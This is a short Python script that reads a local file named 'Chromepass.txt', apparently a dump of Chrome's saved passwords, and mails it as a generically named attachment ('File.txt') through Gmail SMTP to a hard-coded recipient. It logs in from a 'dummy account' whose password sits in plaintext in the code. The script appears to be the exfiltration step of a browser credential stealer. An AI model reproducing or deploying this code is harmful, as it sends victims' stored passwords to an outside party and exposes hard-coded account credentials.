
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase

# Pretty straight forward, sending e-mail over SMTP. I have made a dummy account for this.
fromaddr = "dummypython1@gmail.com"
toaddr = "luisxciv@gmail.com"

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "Pick a subject for the email"

body = "This is the body message"

msg.attach(MIMEText(body, 'plain'))

filename = "File.txt"  # The filename it will have, you can comment this out
attachment = open("./Chromepass.txt", "rb")  #

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com:587')
server.starttls()
server.login(fromaddr, "Testing-123")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
